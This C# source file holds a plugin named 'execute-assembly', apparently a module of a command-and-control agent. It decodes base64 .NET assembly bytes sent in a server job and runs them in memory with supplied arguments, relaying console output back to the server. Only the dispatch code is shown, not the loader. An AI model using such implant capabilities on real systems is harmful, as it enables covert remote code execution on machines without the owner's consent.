using Workflow.Contracts;
using Workflow.Models;
using System.Text.Json;
using Workflow.Utilities;
using System.Security.Principal;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "execute-assembly";
        private IDataBroker messageManager { get; set; }
        private ConsoleApplicationExecutor? cae;
        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            if(this.cae is not null)
            {
                if (this.cae.IsRunning())
                {
                    DebugLog.Log($"{Name} task already running [{job.task.id}]");
                    messageManager.Write("Task is already running", job.task.id, true, "error");
                    return;
                }
            }

            ExecuteAssemblyArgs args = JsonSerializer.Deserialize<ExecuteAssemblyArgs>(job.task.parameters);

            if (!args.Validate())
            {
                DebugLog.Log($"{Name} missing assembly bytes [{job.task.id}]");
                messageManager.Write("Missing Assembly Bytes", job.task.id, true, "error");
                return;
            }

            if (messageManager.StdIsBusy())
            {
                DebugLog.Log($"{Name} StdOut already captured [{job.task.id}]");
                messageManager.Write("Something already has StdOut captured", job.task.id, true, "error");
                return;
            }

            DebugLog.Log($"{Name} launching assembly [{job.task.id}]");
            cae = new ConsoleApplicationExecutor(Misc.Base64DecodeToByteArray(args.asm), Misc.SplitCommandLine(args.arguments), job.task.id, messageManager);
            cae.Execute();
            DebugLog.Log($"{Name} completed [{job.task.id}]");
        }
    }
}
